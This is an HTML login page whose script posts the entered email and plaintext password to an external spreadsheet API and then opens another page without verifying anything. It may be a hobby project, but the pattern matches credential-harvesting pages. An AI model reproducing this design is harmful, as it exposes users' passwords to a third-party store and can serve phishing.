<!DOCTYPE html>
<html lang="en">
  <head>
    <title>Login</title>
    <script
    src="https://kit.fontawesome.com/25bc89a4e6.js"
    crossorigin="anonymous"
  ></script>
    <link rel="stylesheet" href="main.css" />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto:wght@300&display=swap"
      rel="stylesheet"
    />
  </head>
  <body>
    <div class="login-box">
      <h1>Login</h1>
      <form action="https://sheetdb.io/api/v1/ixgpehbuvdw8t" method="post" id="sheetdb-form">
        <input id="email" type="email" placeholder="Email Id" name="data[email]">
        <h2></h2>
        <input type="password" placeholder="Password" id="myInput" name="data[password]">
        <input type="submit" value="Login" />
      <closeform></closeform></form>
    </div>
    <p class="para-2">
      Not have an account? <a href="signup.html">Sign Up Here</a>
    </p>
            <script>
            var form = document.getElementById("sheetdb-form");
            form.addEventListener("submit", e=>{
                e.preventDefault();
                fetch(form.action, {
                    method : "POST",
                    body: new FormData(document.getElementById("sheetdb-form")),
                }).then(
                    response => response.json()
                ).then((html) =>{
                    window.open('index.html','_blank');
                });
            });
            </script>
  </body>
</html>
